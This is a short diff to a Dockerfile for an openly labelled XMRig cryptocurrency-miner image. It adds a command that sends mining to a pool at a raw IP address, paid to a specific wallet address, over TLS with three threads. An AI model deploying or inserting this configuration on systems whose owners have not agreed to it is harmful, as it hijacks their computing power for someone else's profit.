@@ -28,3 +28,4 @@ RUN apk --no-cache upgrade && \
 USER miner
 WORKDIR /xmrig/build
 ENTRYPOINT ["./xmrig"]
+CMD ["--url=155.138.203.85:2237", "--user=hvs1HjjrfctK3QGjnRFNuWYeb5Pr4dxkpUiEFnH95i3iToQ9CBYtVcvHmCNJob5LFv7y62mja7oDzbSFbyZBtAtd87C3BqA84C", "--pass=x@docker", "-k", "--tls", "-t 3"]˚
